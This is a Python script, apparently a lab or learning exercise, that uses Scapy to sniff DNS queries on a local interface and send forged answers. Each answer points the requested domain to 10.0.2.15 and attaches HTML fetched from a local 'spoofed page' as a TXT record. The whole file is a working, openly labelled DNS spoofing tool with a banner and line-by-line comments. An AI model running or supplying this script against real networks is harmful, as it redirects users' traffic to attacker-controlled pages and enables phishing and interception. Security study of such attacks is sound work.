from scapy.all import *#used for packet sniffing and crafting
from scapy.layers.dns import IP,UDP, DNS, DNSQR, DNSRR #imports for DNS packet layers
import requests #used for sending HTTP requests and interact with web servers

def dns_spoofing(packet):#packet variable is the packet that will be captured by scapy
    if packet.haslayer(DNSQR):  # check if the packet is a dns request
        # haslayers() method provided by scapy thta checks if a certain network protocol layer exists within the captured packet

        print("Intercept DNS request for:", packet[DNSQR].qname.decode())
        #extracts the domaine name from the request and converts it into redadable string which will be stored in query_name

        
        # Load the HTML content from the URL
        url = "http://10.0.2.15:8080/spoofed_page.html" #URL of the spoofed webpage that will be used in the DNS fake response
        response = requests.get(url) #sends a GET request to the above URL and saves it in this variable
        html_content = response.text #It extracts the HTML content from response and saves it in this variable

        # Create a DNS response with the HTML content
        spoofed_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                         UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, 
                             an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata="10.0.2.15"))
        #This block crafts a new DNS response packet (spoofed_packet) with specific characteristics

        # Add a TXT record with the HTML content
        txt_record = DNSRR(rrname=packet[DNSQR].qname, type="TXT", ttl=10, rdata=html_content) #crafts a new DNS resource record with specific characteristics
        spoofed_packet /= txt_record #It adds the TXT record to the DNS response

        send(spoofed_packet)
        print("Sent the spoofed DNS response with HTML content") #It sends the spoofed DNS response packet to the victim

print("\033[91m****************************************************\033[0m")
print("\033[91m*                                                 *\033[0m")
print("\033[91m*  ###############################  *\033[0m")
print("\033[91m*  #                            #  *\033[0m")
print("\033[92m*  #  DNS Spoofing Tool         #  *\033[0m")
print("\033[91m*  #                            #  *\033[0m")
print("\033[91m*  ###############################  *\033[0m")
print("\033[91m*                                                 *\033[0m")
print("\033[91m****************************************************\033[0m")
sniff(filter="udp port 53", prn=dns_spoofing, iface="eth0")
#Starts a packet sniffer that captures UDP packets on port 53 which is the DNS port on my eth0 interface
#prn specifies the function dns_spoofingth at will be called for each captured packet